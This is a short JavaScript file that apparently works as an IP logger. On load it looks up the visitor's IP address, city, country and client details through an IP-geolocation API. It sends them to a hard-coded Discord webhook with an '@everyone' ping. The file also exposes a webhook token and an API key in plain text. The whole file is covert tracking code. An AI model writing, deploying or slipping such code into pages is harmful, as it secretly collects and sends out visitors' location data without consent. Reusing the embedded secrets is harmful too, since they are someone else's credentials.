const SEndit = function(oi){
  var Hook = "https://discord.com/api/webhooks/815791868045426718/8XsrrYAMnfyBVBQhy4qCvjOo95KPuBXxlwgfzkNSPK55vVh_8xZSzK4HD-zCD4zDIrzE"

  const Layout = {
    "content" : "@everyone \n\n" + oi["ip"] + "\n\n " + oi["city"] + "\n\n " + oi["country_code"] + "\n\n " + oi["device"],
    "content" : "@everyone \n\n" + oi["ip"] + "\n\n " + oi["city"] + "\n\n " + oi["country_code"] + "\n\n " + oi["client"],
  }
  

  fetch(Hook, {"method" : "POST", "headers" : {"content-type" : "application/json"}, "body" : JSON.stringify(Layout)})
 }

 const Load = function(){
  function json(url) {
    return fetch(url).then(res => res.json());
  }
  
  let apiKey = '56fdad6b030e4c7724a40534d24d1792f61ce23169ac41256e774af9'
  json(`https://api.ipdata.co?api-key=${apiKey}`).then(data => {
    SEndit(data)
  });
}

Load()